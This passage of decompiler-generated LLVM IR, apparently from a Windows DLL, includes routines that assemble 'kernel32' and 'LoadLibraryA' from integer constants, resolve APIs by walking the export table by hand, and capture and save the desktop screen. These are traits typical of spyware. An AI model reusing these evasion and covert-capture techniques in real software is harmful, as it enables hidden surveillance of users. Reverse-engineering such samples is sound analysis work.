  %39 = call i32 @function_10001d90(i8* bitcast (i32* @4 to i8*), i32 ptrtoint (i32* @4 to i32)), !insn.addr !530
  %40 = add i32 %esp.1.reload, -4, !insn.addr !531
  %41 = inttoptr i32 %40 to i32*, !insn.addr !531
  store i32 ptrtoint (i32* @global_var_1003ada4 to i32), i32* %41, align 4, !insn.addr !531
  %42 = add i32 %esp.1.reload, 12, !insn.addr !532
  %43 = add i32 %esp.1.reload, -8, !insn.addr !533
  %44 = inttoptr i32 %43 to i32*, !insn.addr !533
  store i32 %42, i32* %44, align 4, !insn.addr !533
  %45 = call i32 @"__CxxThrowException@8"(), !insn.addr !534
  %46 = call i32 @__asm_int3(), !insn.addr !535
  %47 = call i32 @__asm_int3(), !insn.addr !536
  %48 = call i32 @__asm_int3(), !insn.addr !537
  %49 = call i32 @__asm_int3(), !insn.addr !538
  %50 = call i32 @__asm_int3(), !insn.addr !539
  %51 = call i32 @__asm_int3(), !insn.addr !540
  %52 = call i32 @__asm_int3(), !insn.addr !541
  %53 = call i32 @__asm_int3(), !insn.addr !542
  %54 = call i32 @__asm_int3(), !insn.addr !543
  %55 = call i32 @__asm_int3(), !insn.addr !544
  %56 = call i32 @__asm_int3(), !insn.addr !545
  %57 = call i32 @__asm_int3(), !insn.addr !546
  %58 = call i32 @__asm_int3(), !insn.addr !547
  %59 = add i32 %esp.1.reload, -12, !insn.addr !548
  %60 = inttoptr i32 %59 to i32*, !insn.addr !548
  %61 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !548
  store i32 %61, i32* %60, align 4, !insn.addr !548
  %62 = add i32 %esp.1.reload, -16, !insn.addr !549
  %63 = inttoptr i32 %62 to i32*, !insn.addr !549
  store i32 -1, i32* %63, align 4, !insn.addr !549
  %64 = add i32 %esp.1.reload, -20, !insn.addr !550
  %65 = inttoptr i32 %64 to i32*, !insn.addr !550
  store i32 268611184, i32* %65, align 4, !insn.addr !550
  %66 = call i32 @__readfsdword(i32 0), !insn.addr !551
  %67 = add i32 %esp.1.reload, -24, !insn.addr !552
  %68 = inttoptr i32 %67 to i32*, !insn.addr !552
  store i32 %66, i32* %68, align 4, !insn.addr !552
  %69 = add i32 %esp.1.reload, -28, !insn.addr !553
  %70 = inttoptr i32 %69 to i32*, !insn.addr !553
  %71 = load i32, i32* @global_var_1003d084, align 4, !insn.addr !554
  %72 = xor i32 %71, %59, !insn.addr !555
  %73 = add i32 %esp.1.reload, -32, !insn.addr !556
  %74 = inttoptr i32 %73 to i32*, !insn.addr !556
  store i32 %72, i32* %74, align 4, !insn.addr !556
  call void @__writefsdword(i32 0, i32 %67), !insn.addr !557
  %75 = add i32 %esp.1.reload, 68, !insn.addr !558
  %76 = inttoptr i32 %75 to i32*, !insn.addr !558
  %77 = load i32, i32* %76, align 4, !insn.addr !558
  %78 = load i32, i32* %41, align 4, !insn.addr !559
  store i32 0, i32* %63, align 4, !insn.addr !560
  %79 = add i32 %77, 4, !insn.addr !561
  %80 = inttoptr i32 %79 to i32*, !insn.addr !561
  %81 = load i32, i32* %80, align 4, !insn.addr !561
  %82 = add i32 %78, 4, !insn.addr !562
  %83 = inttoptr i32 %82 to i32*, !insn.addr !562
  store i32 %81, i32* %83, align 4, !insn.addr !562
  %84 = load i32, i32* %68, align 4, !insn.addr !563
  call void @__writefsdword(i32 0, i32 %84), !insn.addr !564
  ret void, !insn.addr !565
}

define i32 @function_10001ed0(i32 %arg1) local_unnamed_addr {
dec_label_pc_10001ed0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_3()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !566
  %3 = add i32 %0, 4, !insn.addr !567
  %4 = inttoptr i32 %0 to i32*, !insn.addr !568
  store i32 ptrtoint (%vtable_1002c3b4_type* @global_var_1002c3b4 to i32), i32* %4, align 4, !insn.addr !568
  %5 = inttoptr i32 %3 to i64*, !insn.addr !569
  %6 = load i64, i64* %5, align 4, !insn.addr !569
  call void @__asm_movq.32(i64 %6, i128 %2), !insn.addr !569
  %7 = call i32 @___std_exception_copy(), !insn.addr !570
  store i32 ptrtoint (%vtable_1002c434_type* @global_var_1002c434 to i32), i32* %4, align 4, !insn.addr !571
  %8 = add i32 %arg1, 12, !insn.addr !572
  %9 = inttoptr i32 %8 to i32*, !insn.addr !572
  %10 = load i32, i32* %9, align 4, !insn.addr !572
  %11 = add i32 %0, 12, !insn.addr !573
  %12 = inttoptr i32 %11 to i32*, !insn.addr !573
  store i32 %10, i32* %12, align 4, !insn.addr !573
  %13 = add i32 %arg1, 16, !insn.addr !574
  %14 = inttoptr i32 %13 to i32*, !insn.addr !574
  %15 = load i32, i32* %14, align 4, !insn.addr !574
  %16 = add i32 %0, 16, !insn.addr !575
  %17 = inttoptr i32 %16 to i32*, !insn.addr !575
  store i32 %15, i32* %17, align 4, !insn.addr !575
  store i32 ptrtoint (i32* @global_var_1002c468 to i32), i32* %4, align 4, !insn.addr !576
  ret i32 %0, !insn.addr !577
}

define i32 @function_10001f20(i32 %arg1) local_unnamed_addr {
dec_label_pc_10001f20:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_3()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !578
  %3 = add i32 %0, 4, !insn.addr !579
  %4 = inttoptr i32 %0 to i32*, !insn.addr !580
  store i32 ptrtoint (%vtable_1002c3b4_type* @global_var_1002c3b4 to i32), i32* %4, align 4, !insn.addr !580
  %5 = inttoptr i32 %3 to i64*, !insn.addr !581
  %6 = load i64, i64* %5, align 4, !insn.addr !581
  call void @__asm_movq.32(i64 %6, i128 %2), !insn.addr !581
  %7 = call i32 @___std_exception_copy(), !insn.addr !582
  store i32 ptrtoint (%vtable_1002c434_type* @global_var_1002c434 to i32), i32* %4, align 4, !insn.addr !583
  %8 = add i32 %arg1, 12, !insn.addr !584
  %9 = inttoptr i32 %8 to i32*, !insn.addr !584
  %10 = load i32, i32* %9, align 4, !insn.addr !584
  %11 = add i32 %0, 12, !insn.addr !585
  %12 = inttoptr i32 %11 to i32*, !insn.addr !585
  store i32 %10, i32* %12, align 4, !insn.addr !585
  %13 = add i32 %arg1, 16, !insn.addr !586
  %14 = inttoptr i32 %13 to i32*, !insn.addr !586
  %15 = load i32, i32* %14, align 4, !insn.addr !586
  %16 = add i32 %0, 16, !insn.addr !587
  %17 = inttoptr i32 %16 to i32*, !insn.addr !587
  store i32 %15, i32* %17, align 4, !insn.addr !587
  store i32 ptrtoint (i32* @global_var_1002c440 to i32), i32* %4, align 4, !insn.addr !588
  ret i32 %0, !insn.addr !589
}

define i32 @function_10001f70(i32 %arg1) local_unnamed_addr {
dec_label_pc_10001f70:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_3()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !590
  %3 = add i32 %0, 4, !insn.addr !591
  %4 = inttoptr i32 %0 to i32*, !insn.addr !592
  store i32 ptrtoint (%vtable_1002c3b4_type* @global_var_1002c3b4 to i32), i32* %4, align 4, !insn.addr !592
  %5 = inttoptr i32 %3 to i64*, !insn.addr !593
  %6 = load i64, i64* %5, align 4, !insn.addr !593
  call void @__asm_movq.32(i64 %6, i128 %2), !insn.addr !593
  %7 = call i32 @___std_exception_copy(), !insn.addr !594
  store i32 ptrtoint (%vtable_1002c434_type* @global_var_1002c434 to i32), i32* %4, align 4, !insn.addr !595
  %8 = add i32 %arg1, 12, !insn.addr !596
  %9 = inttoptr i32 %8 to i32*, !insn.addr !596
  %10 = load i32, i32* %9, align 4, !insn.addr !596
  %11 = add i32 %0, 12, !insn.addr !597
  %12 = inttoptr i32 %11 to i32*, !insn.addr !597
  store i32 %10, i32* %12, align 4, !insn.addr !597
  %13 = add i32 %arg1, 16, !insn.addr !598
  %14 = inttoptr i32 %13 to i32*, !insn.addr !598
  %15 = load i32, i32* %14, align 4, !insn.addr !598
  %16 = add i32 %0, 16, !insn.addr !599
  %17 = inttoptr i32 %16 to i32*, !insn.addr !599
  store i32 %15, i32* %17, align 4, !insn.addr !599
  ret i32 %0, !insn.addr !600
}

define i32 @function_10001fc0(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10001fc0:
  %.reg2mem9 = alloca i32, !insn.addr !601
  %ecx.0.reg2mem = alloca i32, !insn.addr !601
  %eax.0.reg2mem = alloca i32, !insn.addr !601
  %.reg2mem7 = alloca i32, !insn.addr !601
  %edi.0.reg2mem = alloca i32, !insn.addr !601
  %esi.0.reg2mem = alloca i32, !insn.addr !601
  %.reg2mem = alloca i32, !insn.addr !601
  %edx = alloca i32, align 8
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-207 = alloca i32, align 4
  %0 = call i32* @_memset(i32* nonnull %stack_var_-207, i32 0, i32 99), !insn.addr !602
  %1 = call i32* @_memset(i32* nonnull %stack_var_-108, i32 0, i32 100), !insn.addr !603
  store i32 1852990827, i32* %stack_var_-208, align 4, !insn.addr !604
  %2 = bitcast i32* %stack_var_-208 to i8*
  %3 = call i32* @GetModuleHandleA(i8* nonnull %2), !insn.addr !605
  %4 = ptrtoint i32* %3 to i32, !insn.addr !605
  store i32 1684107084, i32* %stack_var_-108, align 4, !insn.addr !606
  %5 = add i32 %4, 60, !insn.addr !607
  %6 = inttoptr i32 %5 to i32*, !insn.addr !607
  %7 = load i32, i32* %6, align 4, !insn.addr !607
  %8 = add i32 %4, 120, !insn.addr !608
  %9 = add i32 %8, %7, !insn.addr !608
  %10 = inttoptr i32 %9 to i32*, !insn.addr !608
  %11 = load i32, i32* %10, align 4, !insn.addr !608
  %12 = add i32 %11, %4, !insn.addr !609
  %13 = call i32 @function_10008e40(i32 %4, i32* nonnull %stack_var_-108), !insn.addr !610
  %14 = add i32 %12, 36, !insn.addr !611
  %15 = inttoptr i32 %14 to i32*, !insn.addr !611
  %16 = load i32, i32* %15, align 4, !insn.addr !611
  %17 = mul i32 %13, 2, !insn.addr !612
  %18 = add i32 %17, %4, !insn.addr !612
  %19 = add i32 %18, %16, !insn.addr !613
  %20 = inttoptr i32 %19 to i16*, !insn.addr !613
  %21 = load i16, i16* %20, align 2, !insn.addr !613
  %22 = zext i16 %21 to i32, !insn.addr !613
  %23 = add i32 %12, 28, !insn.addr !614
  %24 = inttoptr i32 %23 to i32*, !insn.addr !614
  %25 = load i32, i32* %24, align 4, !insn.addr !614
  %26 = mul i32 %22, 4, !insn.addr !615
  %27 = add i32 %25, %4, !insn.addr !615
  %28 = add i32 %27, %26, !insn.addr !616
  %29 = inttoptr i32 %28 to i32*, !insn.addr !616
  %30 = load i32, i32* %29, align 4, !insn.addr !616
  %31 = add i32 %30, %4, !insn.addr !617
  store i32 %31, i32* @global_var_1003ed24, align 4, !insn.addr !618
  store i32 1633906508, i32* %stack_var_-108, align 4, !insn.addr !619
  %32 = add i32 %31, 60, !insn.addr !620
  %33 = inttoptr i32 %32 to i32*, !insn.addr !620
  %34 = load i32, i32* %33, align 4, !insn.addr !620
  %35 = add i32 %31, 120, !insn.addr !621
  %36 = add i32 %35, %34, !insn.addr !621
  %37 = inttoptr i32 %36 to i32*, !insn.addr !621
  %38 = load i32, i32* %37, align 4, !insn.addr !621
  %39 = add i32 %31, 24, !insn.addr !622
  %40 = add i32 %39, %38, !insn.addr !623
  %41 = inttoptr i32 %40 to i32*, !insn.addr !623
  %42 = load i32, i32* %41, align 4, !insn.addr !623
  store i32 %42, i32* %edx, align 8, !insn.addr !623
  %43 = call i32 @function_10008e40(i32 %31, i32* nonnull %stack_var_-108), !insn.addr !624
  store i32 0, i32* %stack_var_-212, align 4, !insn.addr !625
  store i32 0, i32* %stack_var_-216, align 4, !insn.addr !626
  %44 = call i32 @GdipGetImageEncodersSize(i32* nonnull %stack_var_-212, i32* nonnull %stack_var_-216), !insn.addr !627
  %45 = load i32, i32* %stack_var_-216, align 4, !insn.addr !628
  %46 = icmp eq i32 %45, 0, !insn.addr !629
  %47 = icmp eq i1 %46, false, !insn.addr !630
  br i1 %47, label %dec_label_pc_1000211d, label %dec_label_pc_1000210a, !insn.addr !630

dec_label_pc_1000210a:                            ; preds = %dec_label_pc_10001fc0
  %48 = call i32 @"@__security_check_cookie@4"(), !insn.addr !631
  ret i32 %48, !insn.addr !632

dec_label_pc_1000211d:                            ; preds = %dec_label_pc_10001fc0
  %49 = call i32* @LocalAlloc(i32 64, i32 %45), !insn.addr !633
  %50 = icmp eq i32* %49, null, !insn.addr !634
  br i1 %50, label %dec_label_pc_10002199, label %dec_label_pc_1000212d, !insn.addr !635

dec_label_pc_1000212d:                            ; preds = %dec_label_pc_1000211d
  %51 = load i32, i32* %stack_var_-216, align 4, !insn.addr !636
  %52 = load i32, i32* %stack_var_-212, align 4, !insn.addr !637
  %53 = call i32 @GdipGetImageEncoders(i32 %52, i32 %51, i32* nonnull %49), !insn.addr !638
  %54 = load i32, i32* %stack_var_-212, align 4, !insn.addr !639
  %55 = icmp eq i32 %54, 0, !insn.addr !639
  br i1 %55, label %dec_label_pc_10002199, label %dec_label_pc_1000214a, !insn.addr !640

dec_label_pc_1000214a:                            ; preds = %dec_label_pc_1000212d
  %56 = ptrtoint i32* %49 to i32, !insn.addr !633
  %57 = add i32 %56, 48, !insn.addr !641
  store i32 %42, i32* %.reg2mem, !insn.addr !642
  store i32 0, i32* %esi.0.reg2mem, !insn.addr !642
  store i32 %57, i32* %edi.0.reg2mem, !insn.addr !642
  br label %dec_label_pc_10002150, !insn.addr !642

dec_label_pc_10002150:                            ; preds = %dec_label_pc_10002186, %dec_label_pc_1000214a
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %58 = inttoptr i32 %edi.0.reload to i32*, !insn.addr !643
  %59 = load i32, i32* %58, align 4, !insn.addr !643
  store i32 %.reload, i32* %.reg2mem7, !insn.addr !644
  store i32 ptrtoint ([11 x i16]* @global_var_100381dc to i32), i32* %eax.0.reg2mem, !insn.addr !644
  store i32 %59, i32* %ecx.0.reg2mem, !insn.addr !644
  br label %dec_label_pc_10002157, !insn.addr !644

dec_label_pc_10002157:                            ; preds = %dec_label_pc_1000216e, %dec_label_pc_10002150
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %.reload8 = load i32, i32* %.reg2mem7, !insn.addr !645
  %60 = inttoptr i32 %ecx.0.reload to i16*, !insn.addr !645
  %61 = load i16, i16* %60, align 2, !insn.addr !645
  %62 = zext i16 %61 to i32, !insn.addr !645
  %63 = and i32 %.reload8, -65536, !insn.addr !645
  %64 = or i32 %63, %62, !insn.addr !645
  store i32 %64, i32* %edx, align 8, !insn.addr !645
  %65 = inttoptr i32 %eax.0.reload to i16*, !insn.addr !646
  %66 = load i16, i16* %65, align 4, !insn.addr !646
  %67 = icmp eq i16 %61, %66, !insn.addr !646
  %68 = icmp eq i1 %67, false, !insn.addr !647
  store i32 %64, i32* %.reg2mem9, !insn.addr !647
  br i1 %68, label %dec_label_pc_10002186, label %dec_label_pc_1000215f, !insn.addr !647

dec_label_pc_1000215f:                            ; preds = %dec_label_pc_10002157
  %69 = icmp eq i16 %61, 0, !insn.addr !648
  br i1 %69, label %dec_label_pc_100021ad, label %dec_label_pc_10002164, !insn.addr !649

dec_label_pc_10002164:                            ; preds = %dec_label_pc_1000215f
  %70 = add i32 %ecx.0.reload, 2, !insn.addr !650
  %71 = inttoptr i32 %70 to i16*, !insn.addr !650
  %72 = load i16, i16* %71, align 2, !insn.addr !650
  %73 = zext i16 %72 to i32, !insn.addr !650
  %74 = or i32 %63, %73, !insn.addr !650
  store i32 %74, i32* %edx, align 8, !insn.addr !650
  %75 = or i32 %eax.0.reload, 2, !insn.addr !651
  %76 = inttoptr i32 %75 to i16*, !insn.addr !651
  %77 = load i16, i16* %76, align 2, !insn.addr !651
  %78 = icmp eq i16 %72, %77, !insn.addr !651
  %79 = icmp eq i1 %78, false, !insn.addr !652
  store i32 %74, i32* %.reg2mem9, !insn.addr !652
  br i1 %79, label %dec_label_pc_10002186, label %dec_label_pc_1000216e, !insn.addr !652

dec_label_pc_1000216e:                            ; preds = %dec_label_pc_10002164
  %80 = add i32 %ecx.0.reload, 4, !insn.addr !653
  %81 = add i32 %eax.0.reload, 4, !insn.addr !654
  %82 = icmp eq i16 %72, 0, !insn.addr !655
  %83 = icmp eq i1 %82, false, !insn.addr !656
  store i32 %74, i32* %.reg2mem7, !insn.addr !656
  store i32 %81, i32* %eax.0.reg2mem, !insn.addr !656
  store i32 %80, i32* %ecx.0.reg2mem, !insn.addr !656
  br i1 %83, label %dec_label_pc_10002157, label %dec_label_pc_100021ad, !insn.addr !656

dec_label_pc_10002186:                            ; preds = %dec_label_pc_10002164, %dec_label_pc_10002157
  %.reload10 = load i32, i32* %.reg2mem9
  %84 = add nuw i32 %esi.0.reload, 1, !insn.addr !657
  %85 = add i32 %edi.0.reload, 76, !insn.addr !658
  %86 = icmp ult i32 %84, %54, !insn.addr !659
  store i32 %.reload10, i32* %.reg2mem, !insn.addr !660
  store i32 %84, i32* %esi.0.reg2mem, !insn.addr !660
  store i32 %85, i32* %edi.0.reg2mem, !insn.addr !660
  br i1 %86, label %dec_label_pc_10002150, label %dec_label_pc_10002199, !insn.addr !660

dec_label_pc_10002199:                            ; preds = %dec_label_pc_10002186, %dec_label_pc_1000212d, %dec_label_pc_1000211d
  %87 = call i32 @"@__security_check_cookie@4"(), !insn.addr !661
  ret i32 %87, !insn.addr !662

dec_label_pc_100021ad:                            ; preds = %dec_label_pc_1000215f, %dec_label_pc_1000216e
  %88 = mul i32 %esi.0.reload, 76, !insn.addr !663
  %89 = add i32 %88, %56, !insn.addr !664
  %90 = inttoptr i32 %89 to i128*, !insn.addr !664
  %91 = load i128, i128* %90, align 4, !insn.addr !664
  %92 = call i128 @__asm_movups.36(i128 %91), !insn.addr !664
  %93 = bitcast i32* %edx to i128*
  %94 = load i128, i128* %93, align 8, !insn.addr !665
  call void @__asm_movups(i128 %94, i128 %92), !insn.addr !665
  %95 = call i32 @"@__security_check_cookie@4"(), !insn.addr !666
  ret i32 %95, !insn.addr !667
}

define i32 @function_100021e0() local_unnamed_addr {
dec_label_pc_100021e0:
  %esi.0.reg2mem = alloca i32, !insn.addr !668
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !668
  %0 = call i128 @__decompiler_undefined_function_3()
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-312 = alloca i32, align 4
  %stack_var_-556 = alloca i32, align 4
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-332 = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_1()
  %4 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-388 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-372 = alloca i32, align 4
  %stack_var_-219 = alloca i32, align 4
  %stack_var_-392 = alloca i32, align 4
  store i32 20, i32* %stack_var_-372, align 4, !insn.addr !669
  %5 = call i32* @_memset(i32* nonnull %stack_var_-219, i32 0, i32 99), !insn.addr !670
  %6 = call i32* @_memset(i32* nonnull %stack_var_-116, i32 0, i32 100), !insn.addr !671
  store i32 1852990827, i32* %stack_var_-220, align 4, !insn.addr !672
  %7 = bitcast i32* %stack_var_-220 to i8*
  %8 = call i32* @GetModuleHandleA(i8* nonnull %7), !insn.addr !673
  %9 = ptrtoint i32* %8 to i32, !insn.addr !673
  store i32 1684107084, i32* @global_var_1003ff48, align 4, !insn.addr !674
  store i32 1919052108, i32* @global_var_1003ff4c, align 4, !insn.addr !675
  store i32 1098478177, i32* @global_var_1003ff50, align 4, !insn.addr !676
  store i8 0, i8* bitcast (i32* @global_var_1003ff54 to i8*), align 4, !insn.addr !677
  %10 = add i32 %9, 60, !insn.addr !678
  %11 = inttoptr i32 %10 to i32*, !insn.addr !678
  %12 = load i32, i32* %11, align 4, !insn.addr !678
  %13 = add i32 %9, 120, !insn.addr !679
  %14 = add i32 %13, %12, !insn.addr !679
  %15 = inttoptr i32 %14 to i32*, !insn.addr !679
  %16 = load i32, i32* %15, align 4, !insn.addr !679
  %17 = add i32 %16, %9, !insn.addr !680
  %18 = call i32 @function_10008e40(i32 %9, i32* nonnull @global_var_1003ff48), !insn.addr !681
  %19 = add i32 %17, 36, !insn.addr !682
  %20 = inttoptr i32 %19 to i32*, !insn.addr !682
  %21 = load i32, i32* %20, align 4, !insn.addr !682
  %22 = mul i32 %18, 2, !insn.addr !683
  %23 = add i32 %22, %9, !insn.addr !683
  %24 = add i32 %23, %21, !insn.addr !684
  %25 = inttoptr i32 %24 to i16*, !insn.addr !684
  %26 = load i16, i16* %25, align 2, !insn.addr !684
  %27 = zext i16 %26 to i32, !insn.addr !684
  %28 = add i32 %17, 28, !insn.addr !685
  %29 = inttoptr i32 %28 to i32*, !insn.addr !685
  %30 = load i32, i32* %29, align 4, !insn.addr !685
  %31 = mul i32 %27, 4, !insn.addr !686
  %32 = add i32 %30, %9, !insn.addr !686
  %33 = add i32 %32, %31, !insn.addr !687
  %34 = inttoptr i32 %33 to i32*, !insn.addr !687
  %35 = load i32, i32* %34, align 4, !insn.addr !687
  %36 = add i32 %35, %9, !insn.addr !688
  store i32 1919243093, i32* %stack_var_-116, align 4, !insn.addr !689
  store i32 %36, i32* @global_var_1003ed20, align 4, !insn.addr !690
  %37 = call i32 @function_10008e40(i32 %36, i32* bitcast ([14 x i8]* @global_var_100381bc to i32*)), !insn.addr !691
  store i32 1885955143, i32* %stack_var_-116, align 4, !insn.addr !692
  %38 = call i32 @function_10007dc0(), !insn.addr !693
  store i32 1, i32* %stack_var_-388, align 4, !insn.addr !694
  %39 = call i32 @GdiplusStartup(i32* nonnull %stack_var_-344, i32* nonnull %stack_var_-388, i32* null), !insn.addr !695
  %40 = call i32* @GetDesktopWindow(), !insn.addr !696
  %41 = call i32* @GetWindowDC(i32* %40), !insn.addr !697
  %42 = sub i32 %3, %4, !insn.addr !698
  store i32 %42, i32* %stack_var_-332, align 4, !insn.addr !699
  %43 = call i32 @GetDeviceCaps(i32* %41, i32 12), !insn.addr !700
  %44 = call i32* @CreateCompatibleDC(i32* %41), !insn.addr !701
  %45 = bitcast i32* %stack_var_-392 to i32**
  store i32 40, i32* %stack_var_-280, align 4, !insn.addr !702
  %46 = bitcast i32* %stack_var_-280 to %__MIDL___MIDL_itf_mfobjects_0000_0008_0002*
  %47 = call i32* @CreateDIBSection(i32* %41, %__MIDL___MIDL_itf_mfobjects_0000_0008_0002* nonnull %46, i32 1, i32** nonnull %45, i32* null, i32 0), !insn.addr !703
  %48 = icmp eq i32* %47, null, !insn.addr !704
  %49 = icmp eq i1 %48, false, !insn.addr !705
  br i1 %49, label %dec_label_pc_100024c4, label %dec_label_pc_1000249a, !insn.addr !705

dec_label_pc_1000249a:                            ; preds = %dec_label_pc_100021e0
  %50 = call i1 @DeleteDC(i32* %44), !insn.addr !706
  %51 = call i1 @DeleteDC(i32* %41), !insn.addr !707
  %52 = call i32 @"@__security_check_cookie@4"(), !insn.addr !708
  ret i32 %52, !insn.addr !709

dec_label_pc_100024c4:                            ; preds = %dec_label_pc_100021e0
  %53 = ptrtoint i32* %47 to i32, !insn.addr !703
  %54 = sub i32 %2, %1, !insn.addr !710
  %55 = call i32 @SaveDC(i32* %44), !insn.addr !711
  %56 = call i32* @SelectObject(i32* %44, i32* %47), !insn.addr !712
  %57 = call i1 @BitBlt(i32* %44, i32 0, i32 0, i32 %42, i32 %54, i32* %41, i32 0, i32 0, i32 13369376), !insn.addr !713
  %58 = call i1 @RestoreDC(i32* %44, i32 %55), !insn.addr !714
  %59 = call i1 @DeleteDC(i32* %44), !insn.addr !715
  %60 = call i1 @DeleteDC(i32* %41), !insn.addr !716
  store i32 16, i32* %stack_var_-544, align 4, !insn.addr !717
  %61 = call i32* @GdipAlloc(i32 16), !insn.addr !718
  %62 = ptrtoint i32* %61 to i32, !insn.addr !718
  store i32 %62, i32* %stack_var_-332, align 4, !insn.addr !719
  %63 = icmp eq i32* %61, null, !insn.addr !720
  store i32* %stack_var_-544, i32** %esp.0.in.reg2mem, !insn.addr !721
  store i32 0, i32* %esi.0.reg2mem, !insn.addr !721
  br i1 %63, label %dec_label_pc_10002558, label %dec_label_pc_10002528, !insn.addr !721

dec_label_pc_10002528:                            ; preds = %dec_label_pc_100024c4
  store i32 ptrtoint (%vtable_10038ca4_type* @global_var_10038ca4 to i32), i32* %61, align 4, !insn.addr !722
  %64 = bitcast i32* %stack_var_-332 to i32**
  store i32 %53, i32* %stack_var_-556, align 4, !insn.addr !723
  store i32 0, i32* %stack_var_-332, align 4, !insn.addr !724
  %65 = call i32 @GdipCreateBitmapFromHBITMAP(i32* %47, i32* null, i32** nonnull %64), !insn.addr !725
  %66 = add i32 %62, 8, !insn.addr !726
  %67 = inttoptr i32 %66 to i32*, !insn.addr !726
  store i32 %65, i32* %67, align 4, !insn.addr !726
  %68 = load i32, i32* %stack_var_-332, align 4, !insn.addr !727
  %69 = add i32 %62, 4, !insn.addr !728
  %70 = inttoptr i32 %69 to i32*, !insn.addr !728
  store i32 %68, i32* %70, align 4, !insn.addr !728
  store i32* %stack_var_-556, i32** %esp.0.in.reg2mem, !insn.addr !729
  store i32 %62, i32* %esi.0.reg2mem, !insn.addr !729
  br label %dec_label_pc_10002558, !insn.addr !729

dec_label_pc_10002558:                            ; preds = %dec_label_pc_100024c4, %dec_label_pc_10002528
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %71 = call i128 @__asm_movups.36(i128 492561589), !insn.addr !730
  store i32 1, i32* %stack_var_-312, align 4, !insn.addr !731
  call void @__asm_movups(i128 %0, i128 %71), !insn.addr !732
  %72 = call i32 @function_10001fc0(i32 4, i32* nonnull %stack_var_-372), !insn.addr !733
  %73 = add i32 %esp.0, -4, !insn.addr !734
  %74 = inttoptr i32 %73 to i32*, !insn.addr !734
  %75 = ptrtoint i32* %stack_var_-312 to i32, !insn.addr !734
  store i32 %75, i32* %74, align 4, !insn.addr !734
  %76 = add i32 %esp.0, -8, !insn.addr !735
  %77 = inttoptr i32 %76 to i32*, !insn.addr !735
  %78 = ptrtoint i32* %stack_var_-328 to i32, !insn.addr !735
  store i32 %78, i32* %77, align 4, !insn.addr !735
  %79 = add i32 %esi.0.reload, 4, !insn.addr !736
  %80 = inttoptr i32 %79 to i32*, !insn.addr !736
  %81 = load i32, i32* %80, align 4, !insn.addr !736
  %82 = add i32 %esp.0, -16, !insn.addr !736
  %83 = inttoptr i32 %82 to i32*, !insn.addr !736
  store i32 %81, i32* %83, align 4, !insn.addr !736
  %84 = call i32 @GdipSaveImageToFile(i32* nonnull @4, i16* bitcast (i32* @4 to i16*), i32* nonnull @4, i32* nonnull @4), !insn.addr !737
  %85 = icmp eq i32 %84, 0, !insn.addr !738
  br i1 %85, label %dec_label_pc_100025c5, label %dec_label_pc_100025be, !insn.addr !739

dec_label_pc_100025be:                            ; preds = %dec_label_pc_10002558
  %86 = add i32 %esi.0.reload, 8, !insn.addr !740
  %87 = inttoptr i32 %86 to i32*, !insn.addr !740
  store i32 %84, i32* %87, align 4, !insn.addr !740
  br label %dec_label_pc_100025c5, !insn.addr !741

dec_label_pc_100025c5:                            ; preds = %dec_label_pc_10002558, %dec_label_pc_100025be
  %88 = add i32 %esp.0, -12, !insn.addr !742
  %89 = inttoptr i32 %88 to i32*, !insn.addr !742
  %90 = add i32 %esp.0, -20, !insn.addr !743
  %91 = inttoptr i32 %90 to i32*, !insn.addr !743
  store i32 1, i32* %91, align 4, !insn.addr !743
  %92 = add i32 %esp.0, -24, !insn.addr !744
  %93 = inttoptr i32 %92 to i32*, !insn.addr !744
  store i32 %53, i32* %93, align 4, !insn.addr !744
  %94 = call i1 @DeleteObject(i32* nonnull @4), !insn.addr !745
  %95 = load i32, i32* %stack_var_-344, align 4, !insn.addr !746
  %96 = add i32 %esp.0, -28, !insn.addr !746
  %97 = inttoptr i32 %96 to i32*, !insn.addr !746
  store i32 %95, i32* %97, align 4, !insn.addr !746
  %98 = call i32 @"@__security_check_cookie@4"(), !insn.addr !747
  ret i32 %98, !insn.addr !748
}

define i32 @function_10002600() local_unnamed_addr {
dec_label_pc_10002600:
  %storemerge.reg2mem = alloca i32, !insn.addr !749
  %edx.0.reg2mem = alloca i32, !insn.addr !749
  %.pre-phi.reg2mem = alloca i32, !insn.addr !749
  %ecx.2.reg2mem = alloca i32, !insn.addr !749
  %ecx.1.reg2mem = alloca i32, !insn.addr !749
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !749
  %ecx.0.reg2mem = alloca i32, !insn.addr !749
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-38 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-138 = alloca i32, align 4
  %stack_var_-140 = alloca i128, align 8
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-156 = alloca i16*, align 4
  %1 = call i128 @__decompiler_undefined_function_3()
  %stack_var_-40 = alloca i16*, align 4
  %2 = call i16* @__decompiler_undefined_function_10()
  %stack_var_-4 = alloca i32, align 4
